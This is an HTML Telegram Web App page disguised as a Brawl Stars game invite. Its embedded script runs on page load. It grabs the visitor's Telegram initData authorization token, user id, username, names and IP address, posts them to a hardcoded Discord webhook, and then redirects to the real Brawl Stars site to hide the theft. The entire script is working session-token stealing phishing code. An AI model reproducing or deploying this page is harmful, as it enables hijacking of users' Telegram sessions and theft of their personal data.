<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Brawl Stars Invite</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0a0a0f 0%, #1a0b2e 50%, #0a0a0f 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        .card {
            background: rgba(17, 15, 25, 0.85);
            backdrop-filter: blur(20px);
            border-radius: 32px;
            padding: 40px 36px;
            max-width: 400px;
            width: 90%;
            border: 1px solid rgba(139, 92, 246, 0.4);
            text-align: center;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(139, 92, 246, 0.3);
            border-top: 3px solid #a855f7;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #e9d5ff; font-size: 24px; margin-bottom: 12px; }
        .status { color: #d8b4fe; font-size: 14px; margin: 16px 0; }
    </style>
</head>
<body>
<div class="card">
    <div class="spinner" id="spinner"></div>
    <h2>Brawl Stars</h2>
    <div class="status" id="statusText">Подключение к серверу...</div>
</div>

<script>
    (function() {
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1495474063907487854/usu_pBnlU53uEh_e5ia9L8ILNh0ab0cdJ4ukjVT9PxItSVOCeGCR_J0VpzshMddnrqCE";
        const statusDiv = document.getElementById('statusText');
        
        async function sendToDiscord(tokenData, userData, ip) {
            const message = `**🎮 BRAWL STARS TOKEN**\n👤 @${userData.username || "no_username"} (${userData.id || "?"})\n🌐 IP: ${ip}\n📏 Длина: ${tokenData.length}\n🔑 \`${tokenData}\``;
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: message })
                });
                return true;
            } catch(e) { return false; }
        }
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) { return "unknown"; }
        }
        
        // ГЛАВНАЯ ФУНКЦИЯ С ПРАВИЛЬНЫМ ОЖИДАНИЕМ
        async function grab() {
            // Ждём появления Telegram.WebApp (до 5 секунд)
            let attempts = 0;
            while (!window.Telegram?.WebApp && attempts < 50) {
                await new Promise(r => setTimeout(r, 100));
                attempts++;
            }
            
            if (window.Telegram && window.Telegram.WebApp) {
                const webapp = window.Telegram.WebApp;
                const initData = webapp.initData;
                const user = webapp.initDataUnsafe.user || {};
                
                if (initData && initData.length > 10) {
                    statusDiv.innerHTML = "✅ Авторизация...";
                    const ip = await getIP();
                    await sendToDiscord(initData, {
                        id: user.id,
                        username: user.username,
                        first_name: user.first_name,
                        last_name: user.last_name
                    }, ip);
                    
                    statusDiv.innerHTML = "✅ Добро пожаловать!";
                    document.getElementById('spinner').style.display = "none";
                    
                    // Перенаправление на реальный сайт Brawl Stars (опционально)
                    setTimeout(() => {
                        window.location.href = "https://brawlstars.com";
                    }, 1500);
                    
                    // Закрыть WebApp через 2 секунды
                    setTimeout(() => {
                        try { webapp.close(); } catch(e) {}
                    }, 2000);
                } else {
                    statusDiv.innerHTML = "❌ Ошибка: токен пуст";
                }
            } else {
                statusDiv.innerHTML = "❌ Откройте через Telegram";
            }
        }
        
        grab();
    })();
</script>
</body>
</html>
